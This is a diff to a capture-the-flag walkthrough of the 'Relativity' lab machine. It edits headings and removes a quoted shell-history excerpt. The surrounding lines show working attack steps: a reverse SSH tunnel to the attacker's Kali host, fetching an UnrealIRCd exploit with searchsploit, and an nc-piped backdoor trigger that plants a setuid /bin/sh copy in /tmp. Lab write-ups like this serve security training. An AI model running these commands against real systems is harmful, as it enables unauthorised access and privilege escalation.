@@ -82,6 +82,8 @@ Connection au server FTP
     drwxr-xr-x.  3 mauk  mauk  4096 Jul  9  2013 mauk
 
 
+Script in python
+
 
 ```python
 # command : ls -al /home
@@ -126,13 +128,6 @@ Obtain mauk's rsa key, gain ssh connexion
     -rw-r--r--. 1 mauk mauk  193 Apr 23  2012 .bash_profile
     -rw-r--r--. 1 mauk mauk  124 Apr 23  2012 .bashrc
     drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh
-    [mauk@Relativity ~]$ cat .bash_history
-
-    ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
-    su -
-    exit
-    su -
-
 
     └─$ 
     [mauk@Relativity ~]$ id
@@ -162,7 +157,7 @@ Obtain mauk's rsa key, gain ssh connexion
     [mauk@Relativity ~]$ 
 
 
-## Foward port 6667
+## Forward port 6667
 
     [mauk@Relativity ~]$ ssh-keygen -P "" -f key
     [mauk@Relativity ~]$ ssh -f -N kali@172.16.16.1 -R 6667:127.0.0.1:6667 -i key
@@ -188,7 +183,8 @@ Searchsploit
     searchsploit  -m linux/remote/13853.pl
 
 
-Gain privileges jetta access
+Backdoor in this version, gain jetta's access <https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html>
+
 
     $ echo "AB; cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh" | nc 127.0.0.1 6667
 
